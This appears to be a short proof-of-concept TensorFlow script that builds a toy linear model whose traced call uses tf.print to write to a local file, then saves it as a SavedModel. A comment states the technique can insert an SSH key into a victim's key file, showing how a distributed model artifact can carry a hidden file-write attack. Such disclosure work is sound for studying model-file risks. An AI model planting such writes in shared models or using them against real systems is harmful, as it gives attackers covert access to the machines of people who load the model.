import tensorflow as tf

class SimpleLinearModel(tf.Module):
    def __init__(self):
        self.a = tf.Variable(3.0)
        self.b = tf.Variable(2.0)

    @tf.function
    def __call__(self, x):    
        tf.print("abcd", output_stream = "file://./payload" )
        # this can be used to insert sshkey into the victim's ssh key file.
        return self.a * x + self.b

model = SimpleLinearModel()       
result = model(tf.constant(5.0))

save_dir = 'printv2_local_file'
tf.saved_model.save(model, save_dir)
